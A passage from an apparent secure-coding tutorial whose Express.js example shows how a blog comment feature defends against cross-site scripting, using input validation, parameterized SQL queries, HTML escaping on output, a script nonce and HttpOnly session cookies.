        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
}

// 5. Store comment (secure)
app.post('/post/comment', async (req, res) => {
    try {
        // Validate
        const comment = validateComment(req.body.comment);
        const name = validateComment(req.body.name);
        
        // Store RAW data (don't encode on input)
        await db.query(
            'INSERT INTO comments (post_id, name, comment) VALUES (?, ?, ?)',
            [req.body.postId, name, comment]
        );
        
        res.redirect(`/post?postId=${req.body.postId}`);
        
    } catch (err) {
        res.status(400).send('Invalid input');
    }
});

// 6. Display comments (secure)
app.get('/post', async (req, res) => {
    const postId = parseInt(req.query.postId);
    
    // Fetch comments
    const comments = await db.query(
        'SELECT * FROM comments WHERE post_id = ?',
        [postId]
    );
    
    // Encode on output
    const commentsHtml = comments.map(c => `
        <div class="comment">
            <strong>${escapeHtml(c.name)}</strong>
            <p>${escapeHtml(c.comment)}</p>
        </div>
    `).join('');
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Blog Post</title>
        </head>
        <body>
            <h1>Blog Post</h1>
            
            <h2>Comments</h2>
            ${commentsHtml}
            
            <form method="POST" action="/post/comment">
                <input type="hidden" name="postId" value="${postId}">
                <textarea name="comment" required></textarea>
                <input type="text" name="name" required placeholder="Name">
                <button type="submit">Post Comment</button>
            </form>
            
            <script nonce="${res.locals.nonce}">
                // Only allowed scripts (with nonce) execute
                console.log('Page loaded');
            </script>
        </body>
        </html>
    `);
});

// 7. HttpOnly cookies
app.use(session({
    secret: process.env.SESSION_SECRET,
    cookie: {
        httpOnly: true,      // Prevent document.cookie access
        secure: true,         // HTTPS only
        sameSite: 'strict'   // CSRF protection
    }
}));

app.listen(3000);
```
